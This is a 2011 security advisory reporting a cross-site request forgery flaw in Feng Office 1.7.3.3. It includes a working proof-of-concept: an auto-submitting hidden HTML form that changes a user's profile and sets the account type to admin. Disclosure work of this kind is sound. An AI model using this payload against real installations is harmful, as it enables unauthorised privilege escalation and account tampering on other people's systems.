@@ -1,0 +1,33 @@
+Vulnerability ID: HTB22910
+Reference: http://www.htbridge.ch/advisory/xsrf_csrf_in_feng_office.html
+Product: Feng Office
+Vendor: Secure Data SRL ( http://www.fengoffice.com/ )
+Vulnerable Version: 1.7.3.3 and probably prior versions
+Vendor Notification: 17 March 2011
+Vulnerability Type: CSRF (Cross-Site Request Forgery)
+Risk level: Low
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+The vulnerability exists due to failure in the users editing script to properly verify the source of HTTP request.
+
+Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+Attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/index.php?active_project=0&ajax=true&c=account&a=edi
+t_profile&id=USERID&current=administration" method="post" name="main">
+<input type="hidden" name="user[display_name]" value="test">
+<input type="hidden" name="user[username]" value="test">
+<input type="hidden" name="user[company_id]" value="1">
+<input type="hidden" name="user[personal_project_id]" value="2">
+<input type="hidden" name="user[type]" value="admin">
+<input type="hidden" name="user[auto_assign]" value="0">
+<input type="hidden" name="user[autodetect_time_zone]" value="1">
+<input type="hidden" name="user[timezone]" value="0">
+<input type="hidden" name="user[email]" value="email (at) example (dot) com [email concealed]">
+<input type="hidden" name="user[title]" value="">
+</form>
+<script>
+document.main.submit();
+</script>
